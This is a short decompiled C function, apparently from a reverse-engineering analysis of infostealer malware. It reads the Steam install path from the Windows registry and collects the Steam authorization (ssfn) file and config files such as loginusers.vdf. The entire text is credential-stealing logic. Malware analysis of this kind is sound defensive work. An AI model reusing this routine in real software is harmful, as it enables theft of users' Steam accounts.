int __stdcall vdr_steal_steam_data()
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

  cbData = 0xFF;
  SteamInfo[0] = 0;
  memset(&SteamInfo[1], 0, 0xFEu);
  if ( !RegOpenKeyExA(HKEY_CURRENT_USER, str_Software_Valve_Steam_reg_path, 0, 0x20119u, &hKey) )
  {
    RegQueryValueExA(hKey, str_SteamPath, 0, 0, SteamInfo, &cbData);
  }
  RegCloseKey(hKey);
  memset(sz_steam_config_path, 0, sizeof(sz_steam_config_path));
  lstrcatA(sz_steam_config_path, SteamInfo);
  lstrcatA(sz_steam_config_path, "\\config\\");
  vdr_enum_and_grab_steam_files(SteamInfo, str_ssfn);       // Steam Authorization file
  vdr_enum_and_grab_steam_files(sz_steam_config_path, str_config_vdf);// Configuration files
  vdr_enum_and_grab_steam_files(sz_steam_config_path, str_DialogConfig_vdf);
  vdr_enum_and_grab_steam_files(sz_steam_config_path, DialogConfigOverlay_vdf);
  vdr_enum_and_grab_steam_files(sz_steam_config_path, str_libraryfolders_vdf);
  return vdr_enum_and_grab_steam_files(sz_steam_config_path, str_loginusers_vdf);
}
